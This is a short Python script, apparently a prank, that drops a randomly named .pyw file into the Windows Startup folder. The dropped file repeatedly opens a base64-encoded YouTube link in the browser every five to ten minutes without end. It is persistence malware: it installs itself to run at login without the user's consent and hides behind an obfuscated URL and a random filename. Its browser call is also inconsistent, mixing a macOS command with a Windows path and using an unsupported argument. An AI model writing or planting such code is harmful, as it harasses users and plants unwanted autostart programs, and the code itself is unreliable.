import base64,webbrowser,time,random,os,shutil,sys
from pathlib import Path
url = b'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ=='
home = os.path.expanduser("~")
path = Path(os.path.basename(sys.argv[0]))
chars = ("Q U I E T Y V W E G N Z A L B N C W U I E 0 H Q X M w u h d g s e i u y c b n x m w u y c g w e u 3 1 8 7 2 9 6 4 2 9 8 7 3 4 5 6").split(" ")
name = ""
for i in range(random.randint(30,100)):
    name += chars[random.randint(0,len(chars)-1)]
testfile = open(f"{name}.pyw", "w")
testfile.write("""import base64,webbrowser,time,random
url = b'aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ=='

while True:
    time.sleep(random.randint(5*60,10*60))
    webbrowser.get(chrome_path = 'open -a /Applications/Google\ Chrome.app %s').open(base64.b64decode(url))""")
testfile.close()
original = os.path.abspath(f"{name}.pyw")
target = rf"{home}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
shutil.move(original, target)